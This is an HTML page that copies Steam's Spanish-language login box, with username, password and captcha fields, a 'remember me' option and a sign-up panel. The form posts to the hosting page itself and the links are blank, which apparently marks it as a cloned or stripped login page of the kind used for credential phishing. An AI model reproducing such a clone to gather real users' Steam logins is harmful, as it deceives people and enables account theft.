<html>
           <head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="theme-color" content="#171a21">
		<title>Iniciar sesión</title>
	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">

	
	
	
	
	
	
	</head>
           <body>
            <div class="loginbox">
				<div class="loginbox_left">
					<div class="loginbox_content">
						<h2>Iniciar sesión</h2>
						<p>en una cuenta de Steam existente</p>
						<br>
						<form name="logon" action="" method="POST" id="login_form" style="display: block;">
							<div class="login_row">
								<div class="input_title">Nombre de la cuenta de Steam</div>
								<input class="text_input" type="text" name="username" id="input_username" value="">
							</div>
							<div class="login_row">
								<div class="input_title">Contraseña</div>
								<input class="text_input" type="password" name="password" id="input_password" autocomplete="off">
							</div>
															<div class="login_row">
									<div class="input_title" title="Si seleccionas esta opción, iniciarás sesión automáticamente en tus futuras visitas durante 30 días o hasta que selecciones &quot;Cerrar sesión&quot; en el menú de la cuenta. Esta función solo está disponible para cuentas con Steam Guard activado.">
										<input type="checkbox" name="remember_login" id="remember_login">
										<label for="remember_login">Recordarme en este equipo</label>
									</div>
								</div>
														<div class="login_row" id="captcha_entry" style="display: none;">
								<div id="captcha_image_row">
									<img style="float: left;" id="captchaImg" src="https://steamstore-a.akamaihd.net/public/images/blank.gif" border="0" width="206" height="40">
									<div id="captchaRefresh">
										<span class="linkspan" id="captchaRefreshLink">Actualizar</span>
									</div>
									<div style="clear: left;"></div>
								</div>
								<br>
								<div class="input_title">Introduce los caracteres que aparecen arriba</div>
								<input class="text_input" id="input_captcha" type="text" name="captcha_text">
							</div>
							<div style="display: none;"><input type="submit"></div>
						</form>

						<noscript><p>Javascript debe estar activado para usar este sitio</p></noscript>
						<script>
							document.getElementById('login_form').style.display = 'block';
						</script>
					</div>

					<div class="btn_ctn">
						<div id="login_btn_signin">
							<button type="submit" class="btnv6_blue_hoverfade  btn_medium">
								<span>Iniciar sesión</span>
							</button>
						</div>
						<div id="login_btn_wait" style="display: none;">
							<img src="">
						</div>
					</div>
				</div>
				<div class="loginbox_sep">
				</div>
				<div class="loginbox_right">
					<div class="loginbox_content">
						<h2>Crear</h2>
						<p>Una nueva cuenta gratis</p>
						<br>
						<p>
							Unirse es gratis y su uso, sencillo. Continúa para crear tu cuenta y descargar Steam, la solución digital líder entre los jugadores de PC y Mac.						</p>
						<div class="nonresponsive_hidden">
							<br>
							<p>
								<a target="_top" href="">Obtén más información sobre Steam.</a>
							</p>
						</div>
					</div>

					<a target="_top" href="" class="btnv6_blue_hoverfade btn_medium">
						<span>Crear cuenta</span>
					</a>
				</div>
			</div>
			</body>
</html>